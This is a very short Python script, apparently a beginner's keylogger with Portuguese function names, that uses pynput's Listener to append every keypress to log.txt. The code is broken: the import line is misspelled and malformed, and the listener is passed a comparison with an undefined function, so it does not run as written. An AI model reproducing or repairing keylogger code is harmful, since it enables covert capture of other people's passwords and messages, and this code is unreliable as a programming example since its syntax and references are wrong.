import pynput.keyborad import Listener

def capturar_tecla(tecla):
	with open("log.txt", 'a') as f:
		f.write(f"{tecla}\n");

with Listener(on_press==escrever) as l:
	l.join()
